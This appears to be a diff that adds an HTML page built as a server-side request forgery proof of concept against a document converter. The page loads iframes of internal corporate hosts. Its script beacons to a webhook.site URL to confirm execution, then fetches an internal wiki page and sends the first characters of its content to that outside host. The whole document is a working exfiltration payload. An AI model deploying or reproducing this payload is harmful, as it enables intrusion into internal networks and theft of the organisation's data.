@@ -1,1 +1,42 @@
-<u>Hi from here!</u>u
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><title>DOX-SSRF-ESCALATION</title></head>
+<body style="font-family:sans-serif">
+
+  <h1>DOX-SSRF-ESCALATION</h1>
+  <u>Hi from here!</u>
+  <div id="js-marker">JS did NOT run</div>
+
+  <hr><h3>internal iframes (visual read attempt)</h3>
+
+  <p>nexus (dcai):</p>
+  <iframe src="https://nexus-pr-51-be.dcai.corp.adobe.com/" width="950" height="300"></iframe>
+
+  <p>wiki.corp:</p>
+  <iframe src="https://wiki.corp.adobe.com/" width="950" height="300"></iframe>
+
+  <p>artifactory.corp:</p>
+  <iframe src="https://artifactory.corp.adobe.com/" width="950" height="300"></iframe>
+
+  <p>git.corp:</p>
+  <iframe src="https://git.corp.adobe.com/" width="950" height="300"></iframe>
+
+  <script>
+    // 1) PROOF: server-side JS execution -> beacons to OOB (visible even if PDF download is throttled)
+    var oob = "https://webhook.site/8e9ceeed-435f-4eaa-92f9-fc623ce7eb1e";
+    new Image().src = oob + "/JS_EXECUTED_FROM_ADOBE?t=" + Date.now();
+    fetch(oob + "/JS_FETCH_FROM_ADOBE").catch(function(){});
+    document.getElementById("js-marker").innerText = "JS RAN at " + new Date().toISOString();
+
+    // 2) try to read an internal page via JS and beacon back its content (CORS may block the read)
+    fetch("https://wiki.corp.adobe.com/", {mode:"cors"})
+      .then(function(r){ return r.text(); })
+      .then(function(t){ new Image().src = oob + "/INTERNAL_READ?len=" + t.length + "&head=" + encodeURIComponent(t.slice(0,80)); })
+      .catch(function(e){ new Image().src = oob + "/INTERNAL_READ_BLOCKED?err=" + encodeURIComponent(String(e).slice(0,60)); });
+
+    // 3) tell the Adobe converter we're done, so maximum_wait gives the iframes/JS time to run
+    setTimeout(function(){ if (window.adbe_content_loaded) { window.adbe_content_loaded(); } }, 9000);
+  </script>
+
+</body>
+</html>
